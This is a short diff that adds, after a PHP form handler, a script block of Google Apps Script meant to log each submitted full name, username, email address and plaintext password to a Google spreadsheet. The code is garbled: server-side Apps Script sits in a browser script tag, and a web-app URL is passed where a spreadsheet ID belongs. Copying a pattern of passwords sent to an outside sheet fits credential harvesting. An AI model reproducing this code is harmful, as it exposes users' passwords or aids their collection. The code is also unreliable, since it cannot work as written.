@@ -52,3 +52,22 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     }
 }
 ?>
+
+  <script>
+function doPost(e) {
+  var sheet = SpreadsheetApp.openById("https://script.google.com/macros/s/AKfycbzRorh-ZbyJqCNjh500sqZGvBcUsim386gl7y8_JSu2SbzA8vd7L3_leL9py0yb1crUdw/exec").getActiveSheet();
+  var data = JSON.parse(e.postData.contents);
+  
+  sheet.appendRow([
+    new Date(),
+    data.fullname,
+    data.username,
+    data.emailaddress,
+    data.password,
+  ]);
+
+  return ContentService.createTextOutput("Success").setMimeType(ContentService.MimeType.TEXT);
+}
+
+  </script>
+  
